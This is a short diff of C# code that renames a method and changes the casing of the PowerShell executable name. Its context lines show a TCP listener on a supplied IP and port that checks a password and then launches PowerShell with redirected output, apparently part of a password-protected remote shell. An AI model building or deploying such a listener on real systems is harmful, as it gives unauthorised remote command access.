@@ -13,7 +13,7 @@ namespace ProcessAsyncStreamSamples
     {
         // Define static variables shared by class methods.
         private static StringBuilder sendOutput = null;
-        public static void Createprocess(string SERVER_IP, int port,string pass)
+        public static void CreatePowershellprocess(string SERVER_IP, int port,string pass)
         {
             //---listen at the specified IP and port no.---
             IPAddress localAdd = IPAddress.Parse(SERVER_IP);
@@ -38,7 +38,7 @@ namespace ProcessAsyncStreamSamples
             byte[] outputbuf3 = ASCIIEncoding.ASCII.GetBytes("password correct");
             nwStream.Write(outputbuf3, 0, outputbuf3.Length);
             Process powershell = new Process();
-            powershell.StartInfo.FileName = "powershell.exe";
+            powershell.StartInfo.FileName = "PowerShell.exe";
             powershell.StartInfo.UseShellExecute = false;
             powershell.StartInfo.RedirectStandardOutput = true;
             sendOutput = new StringBuilder();
